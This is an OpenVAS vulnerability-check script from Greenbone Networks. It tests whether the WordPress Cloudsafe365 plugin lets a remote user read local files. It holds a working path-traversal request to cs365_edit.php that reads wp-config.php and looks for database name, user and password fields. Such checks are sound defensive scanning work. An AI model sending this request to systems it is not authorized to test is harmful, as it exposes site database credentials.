###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_55241.nasl 12 2013-10-27 11:15:33Z jan $
#
# WordPress Cloudsafe365 Plugin 'file' Parameter Remote File Disclosure Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "The Cloudsafe365 plugin for WordPress is prone to a file-
disclosure vulnerability because it fails to properly sanitize user-
supplied input.

An attacker can exploit this vulnerability to view local files in the
context of the web server process. This may aid in further attacks.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103555";
CPE = "cpe:/a:wordpress:wordpress";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(55241);
 script_version ("$Revision: 12 $");
 script_tag(name:"cvss_base", value:"6.4");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");

 script_name("WordPress Cloudsafe365 Plugin 'file' Parameter Remote File Disclosure Vulnerability");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/55241");

 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-08-28 18:02:43 +0200 (Tue, 28 Aug 2012)");
 script_description(desc);
 script_summary("Determine if it is possible to read the wp-config.php");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("secpod_wordpress_detect_900182.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("wordpress/installed");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!get_port_state(port))exit(0);

if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);
   
url = dir + '/wp-content/plugins/cloudsafe365-for-wp/admin/editor/cs365_edit.php?file=../../../../../wp-config.php';

if(http_vuln_check(port:port, url:url,pattern:"DB_NAME",extra_check:make_list("DB_USER","DB_PASSWORD"))) {
     
  security_warning(port:port);
  exit(0);

}

exit(0);
